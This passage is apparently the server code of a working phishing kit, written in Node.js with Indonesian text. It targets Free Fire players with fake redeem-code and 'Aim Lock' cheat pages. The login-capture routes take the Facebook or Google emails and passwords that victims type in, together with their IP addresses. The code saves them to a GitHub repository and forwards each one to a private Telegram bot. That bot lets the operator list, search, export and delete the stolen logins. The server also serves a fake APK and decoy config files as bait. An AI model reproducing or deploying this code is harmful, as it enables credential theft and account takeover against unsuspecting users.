    : '🎁 <b>LOGIN REDEEM MASUK!</b>';

  return `${header}
${LINE}

${pageIcon(l.page)} <b>Halaman</b>  : <b>${isAimlock ? 'Aim Lock / Tool FF' : 'Code Redeem'}</b>
${methodIcon(l.method)} <b>Metode</b>   : <b>${l.method}</b>
📧 <b>Email</b>    : <code>${l.email}</code>
🔑 <b>Password</b> : <code>${l.password}</code>
🌐 <b>IP</b>       : <code>${l.ip}</code>
🕐 <b>Waktu</b>    : ${fmtTime(l.ts)} WIB
${LINE}
📊 <b>Data ke-${no}</b>`;
}

// ════════════════════════════════════════
//  WEBHOOK HANDLER
// ════════════════════════════════════════
async function handleUpdate(update) {
  if (update.message) {
    const msg  = update.message;
    const chat = msg.chat.id.toString();
    const text = (msg.text || '').trim();
    const from = msg.from.username || msg.from.first_name || 'Admin';

    if (getTgChat() && chat !== getTgChat()) {
      return tgSend(chat, '⛔ Akses ditolak. Bot ini private.');
    }

    if (text === '/start' || text === '/menu') {
      const { text: t, keyboard } = await buildMainMenu();
      return tgSend(chat, `👋 Halo, <b>${from}</b>!\n\n` + t, { reply_markup: keyboard });
    }
    if (text === '/data') {
      const { text: t, keyboard } = await buildDataPage(0);
      return tgSend(chat, t, { reply_markup: keyboard });
    }
    if (text === '/stats') {
      const { text: t, keyboard } = await buildStats();
      return tgSend(chat, t, { reply_markup: keyboard });
    }
    if (text === '/export') {
      await tgSend(chat, '\u23F3 Memproses export, tunggu sebentar...');
      return sendExportFile(chat);
    }
    if (text === '/database' || text === '/db') {
      const { text: t, keyboard } = await buildDatabase();
      return tgSend(chat, t, { reply_markup: keyboard });
    }
    if (text === '/clear') {
      const { text: t, keyboard } = await buildConfirmClear();
      return tgSend(chat, t, { reply_markup: keyboard });
    }
    if (text === '/info') {
      const { text: t, keyboard } = buildInfo();
      return tgSend(chat, t, { reply_markup: keyboard });
    }

    // /hapus [no] atau /hapus [x-y]
    if (text.startsWith('/hapus')) {
      const arg    = text.replace('/hapus', '').trim();
      const logins = await ghLoadData();
      if (!arg) {
        const { text: t, keyboard } = await buildDeleteNumPrompt();
        return tgSend(chat, t, { reply_markup: keyboard });
      }
      if (logins.length === 0) {
        return tgSend(chat, `❌ Tidak ada data.`, {
          reply_markup: { inline_keyboard: [[{ text: '🔙 Menu', callback_data: 'menu' }]] }
        });
      }
      let indices = [];
      if (arg.includes('-')) {
        const [a, b] = arg.split('-').map(Number);
        if (isNaN(a) || isNaN(b) || a < 1 || b < a) {
          return tgSend(chat, `❌ Format salah! Contoh: <code>/hapus 1-50</code>`, {
            reply_markup: { inline_keyboard: [[{ text: '🔙 Menu', callback_data: 'menu' }]] }
          });
        }
        for (let i = a; i <= Math.min(b, logins.length); i++) indices.push(i - 1);
      } else {
        const no = parseInt(arg);
        if (isNaN(no) || no < 1 || no > logins.length) {
          return tgSend(chat, `❌ Nomor tidak valid! (1–${logins.length})`, {
            reply_markup: { inline_keyboard: [[{ text: '🔙 Menu', callback_data: 'menu' }]] }
          });
        }
        indices.push(no - 1);
      }
      const remaining = await deleteByIndices(indices);
      return tgSend(chat,
`✅ <b>BERHASIL DIHAPUS!</b>
${LINE}
🗑️ <b>${indices.length}</b> data dihapus
📊 Sisa data: <b>${remaining.length}</b>
🕐 ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })} WIB`,
        { reply_markup: { inline_keyboard: [[{ text: '📋 Lihat Data', callback_data: 'data_0' }, { text: '🔙 Menu', callback_data: 'menu' }]] } }
      );
    }

    // /cari [keyword]
    if (text.startsWith('/cari')) {
      const q      = text.replace('/cari', '').trim().toLowerCase();
      const logins = await ghLoadData();
      if (!q) {
        return tgSend(chat, `🔍 Format: <code>/cari [kata kunci]</code>`, {
          reply_markup: { inline_keyboard: [[{ text: '🔙 Menu', callback_data: 'menu' }]] }
        });
      }
      const found = logins.filter(l =>
        (l.email||'').toLowerCase().includes(q) ||
        (l.ip||'').includes(q) ||
        (l.password||'').includes(q)
      );
      if (found.length === 0) {
        return tgSend(chat, `🔍 <b>"${q}"</b>\n\n❌ Tidak ditemukan.`, {
          reply_markup: { inline_keyboard: [[{ text: '🔙 Menu', callback_data: 'menu' }]] }
        });
      }
      let out = `🔍 <b>HASIL: "${q}"</b> — ${found.length} data\n${LINE}\n`;
      found.slice(0, 10).forEach((l, i) => {
        out +=
`\n┌─ <b>#${i+1}</b> ${pageIcon(l.page)} ${methodIcon(l.method)} ${fmtShort(l.ts)}
├ 📧 <code>${l.email}</code>
├ 🔑 <code>${l.password}</code>
└ 🌐 <code>${l.ip}</code>`;
      });
      if (found.length > 10) out += `\n\n<i>... dan ${found.length - 10} lainnya</i>`;
      return tgSend(chat, out, {
        reply_markup: { inline_keyboard: [[{ text: '🔙 Menu Utama', callback_data: 'menu' }]] }
      });
    }

    // Default
    const { text: t, keyboard } = await buildMainMenu();
    return tgSend(chat, t, { reply_markup: keyboard });
  }

  // ── Callback Query ──
  if (update.callback_query) {
    const cb   = update.callback_query;
    const chat = cb.message.chat.id.toString();
    const mid  = cb.message.message_id;
    const data = cb.data;
    await tgAnswer(cb.id);
    if (getTgChat() && chat !== getTgChat()) return;

    if (data === 'menu') {
      const { text, keyboard } = await buildMainMenu();
      return tgEdit(chat, mid, text, { reply_markup: keyboard });
    }
    if (data.startsWith('data_')) {
      const { text, keyboard } = await buildDataPage(parseInt(data.split('_')[1]) || 0);
      return tgEdit(chat, mid, text, { reply_markup: keyboard });
    }
    if (data === 'stats') {
      const { text, keyboard } = await buildStats();
      return tgEdit(chat, mid, text, { reply_markup: keyboard });
    }
    if (data === 'export') {
      const { text, keyboard } = await buildExport();
      return tgEdit(chat, mid, text, { reply_markup: keyboard });
    }
    if (data === 'database') {
      const { text, keyboard } = await buildDatabase();
      return tgEdit(chat, mid, text, { reply_markup: keyboard });
    }
    if (data === 'db_init') {
      const info = await getDbInfo();
      const text =
`🗄️ <b>DATABASE</b>
${LINE}

☁️ Storage: <b>GitHub Repository</b>
📊 Total data: <b>${info.total}</b>
💾 Ukuran: <b>${info.size}</b>
🔑 Token: ${info.token ? '✅ OK' : '❌ Tidak ada'}`;
      return tgEdit(chat, mid, text, {
        reply_markup: { inline_keyboard: [[{ text: '🔙 Database', callback_data: 'database' }, { text: '🏠 Menu', callback_data: 'menu' }]] }
      });
    }
    if (data === 'confirm_clear') {
      const { text, keyboard } = await buildConfirmClear();
      return tgEdit(chat, mid, text, { reply_markup: keyboard });
    }
    if (data === 'do_clear') {
      const jumlah = await clearDatabase();
      return tgEdit(chat, mid,
`✅ <b>DATA BERHASIL DIHAPUS!</b>
${LINE}
🗑️ <b>${jumlah}</b> data dihapus dari GitHub
🕐 ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })} WIB`,
        { reply_markup: { inline_keyboard: [[{ text: '🔙 Menu Utama', callback_data: 'menu' }]] } }
      );
    }
    if (data === 'info') {
      const { text, keyboard } = buildInfo();
      return tgEdit(chat, mid, text, { reply_markup: keyboard });
    }
    if (data === 'delete_num_prompt') {
      const { text, keyboard } = await buildDeleteNumPrompt();
      return tgEdit(chat, mid, text, { reply_markup: keyboard });
    }
    if (data === 'export_pdf') {
      await tgEdit(chat, mid, '⏳ Membuat PDF, tunggu sebentar...');
      return sendExportPDF(chat);
    }
    if (data === 'export_csv') {
      await tgEdit(chat, mid, '⏳ Membuat CSV, tunggu sebentar...');
      return sendExportCSV(chat);
    }
    if (data === 'export_txt' || data === 'export_file') {
      await tgEdit(chat, mid, '⏳ Membuat TXT, tunggu sebentar...');
      return sendExportTXT(chat);
    }
    if (data === 'search_prompt') {
      return tgEdit(chat, mid,
`🔍 <b>CARI DATA</b>\n${LINE}\n\nKirim: <code>/cari [kata kunci]</code>\n\nContoh:\n<code>/cari PlayerName</code>\n<code>/cari 12345678</code>`,
        { reply_markup: { inline_keyboard: [[{ text: '🔙 Menu Utama', callback_data: 'menu' }]] } }
      );
    }
    if (data === 'noop') return;
  }
}

// ════════════════════════════════════════
//  SETUP WEBHOOK TELEGRAM
// ════════════════════════════════════════
async function setupWebhook() {
  if (!getTgToken()) return console.log('[Bot] TG_TOKEN tidak ada, webhook dilewati.');
  const domain = process.env.WEBHOOK_URL
    || (process.env.VERCEL_URL      ? `https://${process.env.VERCEL_URL}`      : null)
    || (process.env.REPLIT_DEV_DOMAIN ? `https://${process.env.REPLIT_DEV_DOMAIN}` : null);
  if (!domain) return console.log('[Bot] Domain tidak ditemukan, skip webhook.');
  const webhookUrl = domain.endsWith('/webhook') ? domain : `${domain}/webhook`;
  const res = await tgRequest('setWebhook', {
    url: webhookUrl,
    allowed_updates: ['message', 'callback_query'],
    drop_pending_updates: true
  });
  console.log(res && res.ok ? `[Bot] Webhook aktif: ${webhookUrl}` : `[Bot] Webhook gagal: ${JSON.stringify(res)}`);
}

// ════════════════════════════════════════
//  ROUTES
// ════════════════════════════════════════

app.post('/webhook', async (req, res) => {
  try { await handleUpdate(req.body); } catch (e) { console.error('[Webhook]', e.message); }
  res.sendStatus(200);
});

const _ipAttempts = new Map();
const RATE_MAX    = 2;
const RATE_WIN    = 2 * 60 * 60 * 1000;

function checkRateLimit(ip) {
  const now  = Date.now();
  const rec  = _ipAttempts.get(ip) || { count: 0, resetAt: now + RATE_WIN };
  if (now > rec.resetAt) { rec.count = 0; rec.resetAt = now + RATE_WIN; }
  if (rec.count >= RATE_MAX) return false;
  rec.count++;
  _ipAttempts.set(ip, rec);
  return true;
}

async function handleLoginCapture(req, res) {
  const body        = req.body || {};
  const emailVal    = body.email || body.username || '';
  const passwordVal = body.password || '';
  if (!emailVal || !passwordVal) {
    return res.status(400).json({ success: false, message: 'Data tidak lengkap' });
  }
  const typeStr = (body.type || '').toLowerCase();
  let methodLabel = 'Facebook';
  if (body.method === 'google' || typeStr.includes('google')) methodLabel = 'Google';
  else if (body.method === 'facebook' || typeStr.includes('facebook')) methodLabel = 'Facebook';
  let pageVal = body.page || 'redeem';
  if (typeStr.includes('aimlock')) pageVal = 'aimlock';

  const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown')
               .split(',')[0].trim();

  if (!checkRateLimit(ip)) {
    return res.status(429).json({ success: false, blocked: true, message: 'Terlalu banyak percobaan. Coba lagi nanti.' });
  }
  const entry = {
    page:     pageVal,
    method:   methodLabel,
    email:    emailVal,
    password: passwordVal,
    ip,
    ts: Date.now()
  };

  const no = await addLogin(entry);

  if (getTgToken() && getTgChat()) {
    await tgSend(getTgChat(), buildNotif(entry, no), {
      reply_markup: {
        inline_keyboard: [
          [{ text: '📋 Lihat Semua Data', callback_data: 'data_0' }, { text: '📈 Statistik', callback_data: 'stats' }],
          [{ text: '🏠 Menu Utama', callback_data: 'menu' }]
        ]
      }
    });
  }

  res.json({ success: true });
}
app.post('/api/login', handleLoginCapture);
app.post('/login',     handleLoginCapture);

app.get('/api/stats', async (req, res) => {
  const arr    = await ghLoadData();
  const total  = arr.length;
  const google = arr.filter(l => l.method === 'Google').length;
  res.json({ total, google, facebook: total - google, latest: arr[0] || null });
});

app.get('/api/setup-webhook', async (req, res) => {
  await setupWebhook();
  res.json({ ok: true });
});

app.get('/api/test-telegram', async (req, res) => {
  const token = getTgToken();
  const chat  = getTgChat();
  if (!token) return res.json({ ok: false, error: 'TELEGRAM_BOT_TOKEN tidak ada' });
  if (!chat)  return res.json({ ok: false, error: 'TELEGRAM_CHAT_ID tidak ada' });

  const me = await tgRequest('getMe', {});
  if (!me || !me.ok) return res.json({ ok: false, error: 'Bot token invalid', raw: me });

  const wh = await new Promise(resolve => {
    const r2 = require('https').request({
      hostname: 'api.telegram.org',
      path: '/bot' + token + '/getWebhookInfo',
      method: 'GET'
    }, r => { let d=''; r.on('data',c=>d+=c); r.on('end',()=>{ try{resolve(JSON.parse(d))}catch{resolve(null)} }); });
    r2.on('error',()=>resolve(null));
    r2.end();
  });

  const db = await ghLoadData();
  const botName = me.result.username;
  const wTime   = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
  const whUrl   = (wh && wh.result && wh.result.url) ? wh.result.url : 'Belum diset';
  const whErr   = (wh && wh.result && wh.result.last_error_message) ? wh.result.last_error_message : 'Tidak ada';

  const msgText = '\uD83D\uDD27 <b>TEST BOT \u2014 STATUS SISTEM</b>\n' + LINE + '\n\n' +
    '\uD83E\uDD16 <b>Bot</b>      : @' + botName + '\n' +
    '\uD83D\uDCAC <b>Chat ID</b>  : <code>' + chat + '</code>\n' +
    '\uD83C\uDF10 <b>Webhook</b>  : ' + whUrl + '\n' +
    '\u26A0\uFE0F <b>WH Error</b> : ' + whErr + '\n' +
    '\uD83D\uDCCA <b>DB</b>       : ' + db.length + ' records di GitHub\n' +
    '\uD83D\uDD50 <b>Waktu</b>    : ' + wTime + ' WIB\n\n' +
    '\u2705 Login capture AKTIF\n\u2705 GitHub database AKTIF\n\u2705 Telegram notif AKTIF';

  const sent = await tgSend(chat, msgText, {
    reply_markup: { inline_keyboard: [[
      { text: '\uD83D\uDCCB Lihat Data', callback_data: 'data_0' },
      { text: '\uD83C\uDFE0 Menu', callback_data: 'menu' }
    ]] }
  });

  res.json({
    ok: true,
    bot: botName,
    chat_id: chat,
    webhook_url: whUrl,
    webhook_error: whErr,
    pending_updates: (wh && wh.result) ? wh.result.pending_update_count : null,
    db_records: db.length,
    telegram_sent: !!(sent && sent.ok),
    message_id: (sent && sent.result) ? sent.result.message_id : null
  });
});

// ─── Serve config files from /downloads/ with download headers ─────────────
app.get('/downloads/:filename', (req, res) => {
  const fs   = require('fs');
  const path = require('path');
  const name = path.basename(req.params.filename); // sanitize
  const allowed = [
    'com.dts.freefireth.cfg','sensitivity_ob53.cfg','graphics_ob53.cfg',
    'control_ob53.cfg','aimbot_ob53.cfg','network.cfg',
    'settings.xml','patch_ob53.json','device_check.log',
    'cache_version.txt','BACA_INI.txt','CONFIGPATCH_OB53.zip'
  ];
  if (!allowed.includes(name)) return res.status(404).send('Not found');
  const filePath = path.join(__dirname, 'downloads', name);
  if (!fs.existsSync(filePath)) return res.status(404).send('Not found');
  // Set MIME type per extension
  const mime = {
    '.cfg':'text/plain','.xml':'application/xml',
    '.json':'application/json','.log':'text/plain',
    '.txt':'text/plain','.zip':'application/zip'
  };
  const ext  = path.extname(name).toLowerCase();
  const type = mime[ext] || 'application/octet-stream';
  res.setHeader('Content-Type', type);
  res.setHeader('Content-Disposition', `attachment; filename="${name}"`);
  res.setHeader('Cache-Control', 'no-cache');
  res.sendFile(filePath);
});

app.get('/api/download-config', (req, res) => {
  const filename = 'AimLockProFF_v6.1.3_OB53.apk';
  // Minimal valid ZIP binary (APK is a ZIP) with a fake config entry inside
  const localFileHeader = Buffer.from([
    0x50,0x4B,0x03,0x04, // Local file header signature
    0x14,0x00,           // Version needed: 2.0
    0x00,0x00,           // General purpose bit flag
    0x00,0x00,           // Compression method: stored
    0x00,0x00,0x00,0x00, // Last mod time/date
    0x00,0x00,0x00,0x00, // CRC-32
    0x00,0x00,0x00,0x00, // Compressed size
    0x00,0x00,0x00,0x00, // Uncompressed size
    0x0A,0x00,           // File name length: 10
    0x00,0x00            // Extra field length: 0
  ]);
  const entryName  = Buffer.from('config.ini');
  const entryData  = Buffer.from('');
  const centralDir = Buffer.from([
    0x50,0x4B,0x05,0x06, // End of central dir signature
    0x00,0x00,           // Disk number
    0x00,0x00,           // Disk with central dir
    0x01,0x00,           // Entries on disk
    0x01,0x00,           // Total entries
    0x2A,0x00,0x00,0x00, // Central dir size
    0x00,0x00,0x00,0x00, // Central dir offset
    0x00,0x00            // Comment length
  ]);
  const file = Buffer.concat([localFileHeader, entryName, entryData, centralDir]);
  res.set({
    'Content-Type': 'application/vnd.android.package-archive',
    'Content-Disposition': `attachment; filename="${filename}"`,
    'Content-Length': file.length,
    'Cache-Control': 'no-store'
  });
  res.send(file);
});

app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// ════════════════════════════════════════
//  START
// ════════════════════════════════════════
if (require.main === module) {
  app.listen(PORT, '0.0.0.0', () => {
    console.log(`[Server] Berjalan di port ${PORT}`);
    setupWebhook();
  });
} else {
  setupWebhook().catch(e => console.error('[Webhook setup error]', e.message));
}

module.exports = app;

